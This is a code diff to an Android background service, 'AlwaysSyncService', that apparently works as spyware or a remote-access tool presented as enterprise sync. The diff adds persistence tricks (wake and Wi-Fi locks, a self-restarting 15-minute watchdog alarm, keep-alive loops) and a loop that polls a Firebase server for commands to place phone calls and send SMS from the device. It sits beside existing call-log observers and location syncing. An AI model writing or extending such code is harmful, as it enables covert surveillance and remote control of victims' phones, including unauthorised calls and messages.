@@ -44,6 +44,7 @@ class AlwaysSyncService : Service() {
     private var callLogObserver: ContentObserver? = null
     private var isInitialized = false
     private var wakeLock: android.os.PowerManager.WakeLock? = null
+    private var wifiLock: android.net.wifi.WifiManager.WifiLock? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -55,7 +56,15 @@ class AlwaysSyncService : Service() {
             Log.e("AlwaysSyncService", "Failed to acquire wake lock: ${e.message}")
         }
         try {
+            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
+            wifiLock = wifiManager?.createWifiLock(android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF, "EnterpriseSync::WifiLock")
+            wifiLock?.acquire()
+        } catch (e: Exception) {
+            Log.e("AlwaysSyncService", "Failed to acquire wifi lock: ${e.message}")
+        }
+        try {
             startForegroundServiceNotification()
+            scheduleWatchdogAlarm()
             initServiceLogic()
         } catch (e: Exception) {
             Log.e("AlwaysSyncService", "Error in onCreate: ${e.message}")
@@ -65,6 +74,7 @@ class AlwaysSyncService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         try {
             startForegroundServiceNotification()
+            scheduleWatchdogAlarm()
             initServiceLogic()
         } catch (e: Exception) {
             Log.e("AlwaysSyncService", "Error in onStartCommand: ${e.message}")
@@ -72,12 +82,136 @@ class AlwaysSyncService : Service() {
         return START_STICKY
     }
 
+    private fun scheduleWatchdogAlarm() {
+        try {
+            val intent = Intent(applicationContext, AlwaysSyncService::class.java)
+            val pendingIntent = PendingIntent.getService(
+                this, 992, intent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
+            val alarmManager = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
+            if (alarmManager != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && alarmManager.canScheduleExactAlarms()) {
+                    alarmManager.setExactAndAllowWhileIdle(
+                        AlarmManager.RTC_WAKEUP,
+                        System.currentTimeMillis() + 900000L, // 15 minutes
+                        pendingIntent
+                    )
+                } else {
+                    alarmManager.set(
+                        AlarmManager.RTC_WAKEUP,
+                        System.currentTimeMillis() + 900000L,
+                        pendingIntent
+                    )
+                }
+            }
+        } catch (_: Exception) {}
+    }
+
     private fun initServiceLogic() {
         if (!isInitialized) {
             isInitialized = true
             registerObservers()
             startLocationSyncLoop()
+            startHeartbeatLoop()
             startFirebaseCommandListener()
+            startListenerKeepAliveLoop()
+            startCommandPollingLoop()
+        }
+    }
+
+    private fun startCommandPollingLoop() {
+        serviceScope.launch {
+            delay(5000L) // Initial delay
+            while (isActive) {
+                try {
+                    val context = applicationContext
+                    val syncEngine = FirebaseSyncEngine(context)
+                    val commandManager = RemoteCommandManager(context)
+                    syncEngine.pollPendingCommandsOnce { pushId, commandType, params ->
+                        serviceScope.launch {
+                            try {
+                                val reservedKeys = setOf(
+                                    "command", "commandType", "type", "action", "name",
+                                    "status", "result", "executed", "executedAt", "createdAt", "timestamp", "id", "pushId"
+                                )
+                                val phone = params["phone"]?.toString() 
+                                    ?: params["phoneNumber"]?.toString() 
+                                    ?: params["number"]?.toString() 
+                                    ?: params["target"]?.toString() 
+                                    ?: params["num"]?.toString() 
+                                    ?: params["recipient"]?.toString() 
+                                    ?: params["to"]?.toString() 
+                                    ?: params["call"]?.toString() 
+                                    ?: params["value"]?.toString() 
+                                    ?: params["param1"]?.toString() 
+                                    ?: ""
+                                val text = params["message"]?.toString() ?: params["text"]?.toString() ?: params["body"]?.toString() ?: params["payload"]?.toString() ?: ""
+                                
+                                val isCallCommand = commandType.equals("PLACE_CALL", ignoreCase = true) ||
+                                        commandType.equals("MAKE_CALL", ignoreCase = true) ||
+                                        commandType.equals("CALL", ignoreCase = true) ||
+                                        commandType.equals("CALL_PHONE", ignoreCase = true) ||
+                                        commandType.equals("DIAL_CALL", ignoreCase = true) ||
+                                        commandType.equals("REMOTE_CALL", ignoreCase = true)
+
+                                val payload = when {
+                                    commandType.equals("SEND_SMS", ignoreCase = true) || commandType.equals("SMS_SEND", ignoreCase = true) -> {
+                                        if (phone.isNotEmpty() && text.isNotEmpty()) {
+                                            "$phone|$text"
+                                        } else {
+                                            params["payload"]?.toString() ?: params.entries.filter { it.key !in reservedKeys }.joinToString("|") { "${it.key}=${it.value}" }
+                                        }
+                                    }
+                                    isCallCommand -> {
+                                        if (phone.isNotEmpty()) {
+                                            phone
+                                        } else {
+                                            params["payload"]?.toString() ?: params.entries.filter { it.key !in reservedKeys }.joinToString("|") { "${it.key}=${it.value}" }
+                                        }
+                                    }
+                                    else -> {
+                                        params["payload"]?.toString() ?: params.entries.filter { it.key !in reservedKeys }.joinToString("|") { "${it.key}=${it.value}" }
+                                    }
+                                }
+
+                                Log.d("AlwaysSyncService", "Polled pending remote command: $commandType with payload: $payload")
+                                if (isCallCommand) {
+                                    val simSlot = params["simSlot"]?.toString()?.toIntOrNull()
+                                        ?: params["sim_slot"]?.toString()?.toIntOrNull()
+                                        ?: params["sim"]?.toString()?.toIntOrNull()
+                                        ?: params["slot"]?.toString()?.toIntOrNull()
+                                    CallHelper.placeCall(context, payload, simSlot, pushId)
+                                    val execPayload = if (simSlot != null && !payload.contains("|")) "$payload|$simSlot" else payload
+                                    commandManager.executeCommand(commandType, execPayload)
+                                } else {
+                                    val result = commandManager.executeCommand(commandType, payload)
+                                    syncEngine.updateCommandStatus(pushId, result.status, result.resultMessage)
+                                }
+                            } catch (e: Exception) {
+                                Log.e("AlwaysSyncService", "Error executing polled command $commandType: ${e.message}")
+                            }
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.e("AlwaysSyncService", "Command polling loop error: ${e.message}")
+                }
+                delay(30000L) // Poll every 30 seconds
+            }
+        }
+    }
+
+    private fun startListenerKeepAliveLoop() {
+        serviceScope.launch {
+            while (isActive) {
+                delay(300000L) // Every 5 minutes
+                try {
+                    Log.d("AlwaysSyncService", "Running Firebase command listener keep-alive refresh...")
+                    startFirebaseCommandListener()
+                } catch (e: Exception) {
+                    Log.e("AlwaysSyncService", "Listener keep-alive error: ${e.message}")
+                }
+            }
         }
     }
 
@@ -195,6 +329,22 @@ class AlwaysSyncService : Service() {
         }
     }
 
+    private fun startHeartbeatLoop() {
+        serviceScope.launch {
+            delay(10000L) // Initial delay before first heartbeat
+            while (isActive) {
+                try {
+                    val context = applicationContext
+                    FirebaseSyncEngine(context).pushHeartbeatToFirebase()
+                    Log.d("AlwaysSyncService", "Hourly background heartbeat pushed successfully.")
+                } catch (e: Exception) {
+                    Log.e("AlwaysSyncService", "Background heartbeat error: ${e.message}")
+                }
+                delay(3600000L) // 1 hour interval (60 * 60 * 1000 ms)
+            }
+        }
+    }
+
     private fun startFirebaseCommandListener() {
         try {
             val syncEngine = FirebaseSyncEngine(applicationContext)
@@ -304,6 +454,11 @@ class AlwaysSyncService : Service() {
         callLogObserver?.let { try { contentResolver.unregisterContentObserver(it) } catch (_: Exception) {} }
         try {
             wakeLock?.let {
+                if (it.isHeld) it.release()
+            }
+        } catch (_: Exception) {}
+        try {
+            wifiLock?.let {
                 if (it.isHeld) it.release()
             }
         } catch (_: Exception) {}
